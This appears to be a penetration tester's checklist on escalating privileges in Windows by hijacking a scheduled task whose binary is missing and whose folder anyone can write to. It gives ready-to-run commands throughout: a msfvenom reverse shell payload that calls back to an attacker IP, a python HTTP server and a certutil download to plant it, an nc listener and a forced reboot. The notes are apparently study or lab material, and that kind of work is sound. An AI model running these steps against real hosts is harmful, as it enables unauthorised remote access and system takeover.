(checklist)

- port scan
- version scan
- service scan

COMMANDS:
Scheduled Tasks

Finding the vulnerabilityNormally, wehave a limited capability to view the Scheduled Tasksthat are owned by other users in a Windows host.

We can run the command below to list all the Tasksthat are owned by the current user that we just compromised.

schtasks /query /fo LIST /v

-Theother way to get an idea of the Scheduled Tasksis if there are exposed folders or any batch scripts that indicates it is as Scheduled Tasks. 

-If it’s a White Boxtest, and we are given a “representative machine” with installed application, we can try to run Autorunand check the “Scheduled Task”functionality. -Run “Autorun” as administrator

Noticed that MyTask2 is trying to load the program.exebinary in C:\Missing Scheduled Binary\program.exe (path but the binary is missing)
 - File not found: C:\Missing Scheduled Binary\program.exe

If we have a write access to the file path, we can just drop our reverse shell payload in that path

The payload will then be executed the next time the Tasksrun.

Run icacls to check our permission in the file path

icacls.exe -w "C:\Missing Scheduled Binary\"
 - Everyone: (F)

Escalate the Privilege
 Generate the payload

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.121.131 lport=4444 -f exe -o program.exe

Let the machine download the program.exe to C:\Missing Scheduled Binary\
sudo python3 -m http.server 8080

cd "C:\Missing Scheduled Binary"
 -certutil -urlcache -f http://192.168.121.131:8080/program.exe program.exe

Setup listener
nc -nlvp 4444

Restart the windows host
 - shutdown /r

Go back to the terminal
